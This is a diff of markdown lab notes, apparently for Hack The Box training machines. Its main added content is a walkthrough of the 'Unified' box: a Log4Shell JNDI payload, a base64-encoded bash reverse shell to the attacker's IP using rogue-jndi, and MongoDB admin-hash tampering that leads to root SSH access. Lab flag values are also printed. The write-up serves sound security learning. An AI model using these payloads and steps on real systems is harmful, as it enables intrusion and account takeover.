@@ -1,11 +1,15 @@
 
 ### **Starting Labs**
 
-##### **Section 3:**
+##### **Tier 2:**
 ###### Vaccine:
-		 --website enum--
+
+---website enum---
+
 run nmap to find open ports
+
 ``nmap -sC -sV {ip}``
+
 we find three ports that are open, the only relative one we can use right now is the ftp port, it states that it accepts ``anonymous`` as a login.
 
 ```	    
@@ -230,4 +234,222 @@ Root: dd6e058e814260bc70e9bbdef2715849
 
 ###### Unified:
 
----website enum---
+---ip enum---
+
+```
+nmap -sC -sV -v {ip address}
+```
+
+We notice that one of the ports is hosting something called "unify", so we check that out. after some testing we dont find anything so we look up the version of unify for known exploits.
+
+We find a cve (CVE-2021-44228) that gives us some context into how to exploit this. We  open our burpsuite and paste the ip of the website into our burp port trigger's url, and send in a fake login attempt with any parameters. 
+
+From there we modify the "remember" section with the following parameters.
+
+```
+"username":"test",
+"password":"test",
+"${jndi:ldap://{ip}:{port}/test}",
+"strict":true
+```
+
+That's when we notice we get back some info
+
+```
+{
+	meta:{
+	"rc":"error",
+	"msg":"api.err.invalid payload"
+	}
+}
+```
+
+This gives us a clue that there is something worth investigating. 
+
+So we can use tcpdump or wireshark to proceed. 
+
+```
+sudo tcpdump -i tun0 port {port}
+```
+
+we get a paragraph of data that has a bunch of captured traffic, the main part that interests us is the ip towards the end.
+
+```
+10.129.70.148.59360
+```
+
+After some more digging I find an interesting page talking about the vulnerability in depth
+'https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi'
+
+We are just gonna install some stuff we are going to need:
+
+```
+git clone https://github.com/veracode-research/rogue-jndi && cd rogue-jndi && mvn package
+
+mvn package
+```
+
+We are then gonna follow the steps in the document, the goal is to create a reverse shell.
+to do this we are first going to encode a string in base64 and then we are going to start using RogueJndi to exploit the website:
+```
+echo 'bash -c bash -i >&/dev/tcp/{tun0 ip}/{port} 0>&1' | base64
+```
+
+After running this command we should get a base64 string. We are then gonna use that encoded string to in our RogueJndi command. 
+
+```
+java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,"{Base64 String}"}|{base64,-d}|{bash,-i}" --hostname "{our tun0 ip}"
+```
+
+if done correctly you should see that it spawned an http and a ldap server.
+HTTP server on port 8000 and LDAP on 1389.
+
+```
+Starting HTTP server on 0.0.0.0:8000
+Starting LDAP server on 0.0.0.0:1389
+```
+
+
+From here we can move back to our burpsuite repeater and modify the remember field again to get access to our reverse shell.
+
+```
+"${jndi:ldap://10.10.14.103:1389/o=tomcat}"
+```
+
+After modifying it you can start a nc to listen to it, and when we connect we use  a script to make it interactive and easier to use.
+
+```
+nc -nlvp {ip}:{port}
+
+script /dev/null -c bash
+```
+
+Hit send and you should get access to the reverse shell, to verify you can type ``whoami`` and you should get a response back saying ``unify``.
+
+Before we try and privilege escalation or upgrading the shell any further, it might serve in our interest to search through some directories and for any interesting files.
+
+we navigate to the root folder via cd, and run a command to search for user and root flags:
+
+```
+cd ../../..
+
+find / -iname "user.txt" 2>/dev/null
+
+sudo find / -iname "root.txt" 2>/dev/null
+
+```
+
+After running the commands we end up only finding the User Flag:
+
+```
+6ced1a6a89e666c0620cdb10262ba127
+```
+
+We can now upgrade our shell by using python to import a library called pty, which will enable us to spawn bash.
+--- privilege escalation --- 
+```
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+```
+
+Met with a error, we realize python is not installed on this device, so we try to exploit via mongo since unifi uses mongo.
+
+we use this command to figure out our mongo port.
+
+```
+ps aux | grep mongo
+```
+
+Our next step is to connect to the mongo database to do that we use:
+here we enter the port we got from the previous command and the name of unifi's default database name (ace), which we got with some google searches. 
+
+```
+mongo --port {port} ace
+```
+
+We then lookup how to retrieve data from mongo and realize that the method is called `find()`
+so we run that method on admin to get user data.
+
+```
+db.admin.find()
+```
+
+Upon looking at the data we get lost with whats shown so to pretty it up we convert it to a json format to make it easier for us to read.
+
+```
+db.admin.find().forEach(printjson);
+```
+
+There now its easier for us to read. We see that the first entry is an admin's data, we copy the password and try to crack it, first step is to try to identify the encryption, then use john to crack it.
+
+```
+cat > text.txt
+
+hashid text.txt
+
+john --wordlist {rockyou path} text.txt
+```
+
+we can probably add extra arguments to try and specify the hash type, but this give us some time to explore some other avenues or take a quick break.
+
+lets try to make our own hash
+
+```
+mkpasswd -m sha-512 testpassword
+```
+
+we get the following output:
+
+```
+$6$fruA9k.oNUkOWRtE$ZUGCpWyUciPHFq.jv5JWyORx7/Kkr49.YR0qgG3E6ifqL9seyBb3HT07TYnrlyXqtivbZLx8SqaJslCIb3/5I/
+```
+
+We now make a new user with the password hash we just generated to be able to connect to it via the website in a sec.
+
+```
+db.admin.insert({
+  "email": "debuguser1001@localhost.local",
+  "last_site_name": "default",
+  "name": "debuguser1001",
+  "time_created": NumberLong(100019800),
+  "x_shadow": "$6$fruA9k.oNUkOWRtE$ZUGCpWyUciPHFq.jv5JWyORx7/Kkr49.YR0qgG3E6ifqL9seyBb3HT07TYnrlyXqtivbZLx8SqaJslCIb3/5I/"
+});
+```
+
+To ensure this was added we can run this command again but modify it to search for names that match our newly made user. Now our user should be listed if done correctly.
+
+```
+db.admin.find({ "name": "debuguser1001" }).forEach(printjson);
+```
+
+Now we can login to the website with those credentials in my case its debuguser1001 and testpassword. After some messing around there is something obviously wrong with our account or the website where we cannot access the majority of the features or the settings on the website. so we will try another approach
+
+Instead of making a new user what if we just updated the password to an existing one ? well to do this i need to use the update method:
+
+```
+db.admin.update({"_id":
+ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$fruA9k.oNUkOWRtE$ZUGCpWyUciPHFq.jv5JWyORx7/Kkr49.YR0qgG3E6ifqL9seyBb3HT07TYnrlyXqtivbZLx8SqaJslCIb3/5I/"}})'
+```
+
+Now we can attempt to login again. After logging in the UI looks functional therefore we can assume we did not create the user with all the information needed, we might have missed a UI option since it seems there is more than 1 UI you can choose so I am speculating things broke down when we did not supply that. 
+
+After some messing around, I found myself in the settings looking at the site tab. after scrolling down I found a ssh section and remembered that we originally scanned an ssh port in our nmap scan so lets try to connect via ssh and see what we can get.
+
+```
+ssh root@{ip}
+```
+
+From here we agree to connecting and enter the password we got from the web page. There we go!! now we are logged in
+
+to see what we are working with we run ``ls`` and see that we only have a root.txt file so lets read that using ``cat root.txt``
+
+and there we go we got our root flag ```
+
+```
+e50bc93c75b634e4b272d2f771c33681
+```
+
+Therefore our flags:
+**user: 6ced1a6a89e666c0620cdb10262ba127
+root: e50bc93c75b634e4b272d2f771c33681
+**
+###### Included:
